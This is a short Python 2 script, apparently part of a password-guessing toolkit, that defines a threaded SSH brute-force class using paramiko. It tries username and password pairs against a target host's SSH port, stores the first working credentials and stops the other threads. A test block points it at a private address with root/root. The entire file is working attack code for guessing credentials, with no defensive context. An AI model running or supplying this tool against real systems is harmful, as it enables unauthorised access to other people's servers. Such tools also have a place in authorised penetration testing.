# -*- coding: UTF-8 -*-
import logging
import paramiko
import burp

class ssh_burp(burp.burp):
    def burp_thread(self,password):
        if self.stop_signal:
            return None
        try:
            burp=True
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            try:
                ssh.connect(self.target,self.port,self.now_user,password)
            except Exception,e:
                burp=False
            if burp:
                ssh.close()
                self.result_pool[self.target+'_'+str(self.port)] = (self.now_user,password)
                self.stop_signal = True
        except Exception,e:
            logging.error(e)

if __name__ == '__main__':
    burp_test = ssh_burp()
    burp_test.init_target('172.17.0.13',22)
    burp_test.init_uspw(['root'],['root'])
    burp_test.start_burp()
    burp_test.checkstate()